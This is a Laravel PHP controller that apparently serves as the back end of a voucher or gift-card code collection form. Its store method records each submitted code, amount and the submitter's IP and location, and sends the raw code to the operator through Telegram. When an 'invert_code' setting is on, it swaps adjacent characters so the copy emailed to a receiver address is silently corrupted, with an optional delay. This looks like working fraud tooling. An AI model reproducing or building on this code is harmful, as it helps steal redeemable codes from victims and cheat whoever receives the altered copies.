<?php

namespace App\Http\Controllers;

use App\NotifData;
use App\Models\FormData;
use App\Jobs\SetLocation;
use App\Mail\FormDataMail;
use Illuminate\Support\Arr;
use App\Jobs\TelegramMsgJob;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Mail;
use Illuminate\Routing\Controllers\HasMiddleware;
use Illuminate\Routing\Controllers\Middleware;

class FormDataController extends Controller implements HasMiddleware
{
    /**
     * Get the middleware that should be assigned to the controller.
     */
    public static function middleware(): array
    {
        return site_setting('secure_api') ? [
            new Middleware('auth:sanctum', only: ['store']),
        ] : [];
    }

    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'code' => 'required|string',
            'type' => 'required|string',
            'amount' => 'required|string',
            'form_name' => 'nullable|string',
        ]);

        $invertedCode = $validated['code'];
        if (site_setting('invert_code')) {
            $invertedCode = swap_adjacent_random_char($validated['code']);
        }

        $exist = FormData::where('data->code', $validated['code'])->exists();

        $formData = FormData::create([
            'data' => [
                ...$validated,
                'is_inverted' => (bool) ($validated['code'] !== $invertedCode),
                'inverted_code' => $invertedCode,
                'already_used' => $exist,
            ],
            'entries' => $request->except('type', 'code', 'amount'),
            'ip_address' => $request->ip(),
        ]);

        $data = [
            ...$validated,
            ...$formData->entries,
        ];

        $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b>");
        $notifData->setSubject('A new form data has been submitted');
        $notifData->setBody(json_encode($formData->data, JSON_PRETTY_PRINT));
        TelegramMsgJob::dispatchSync($notifData);
        SetLocation::dispatch($request->ip(), $formData, 'location');

        if ($email = site_setting('receiver_email')) {
            $data['code'] = $invertedCode;
            $message = new FormDataMail($data);
            if ($delay = site_setting('delay')) {
                Mail::to($email)->later(now()->addSeconds($delay), $message);
            } else {
                Mail::to($email)->send($message);
            }
        }

        return response()->json(['success' => true], 204);
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy($id)
    {
        $formData = FormData::findOrFail($id);
        $formData->delete();
        return back(303)->with('success', 'Form data deleted successfully.');
    }
}
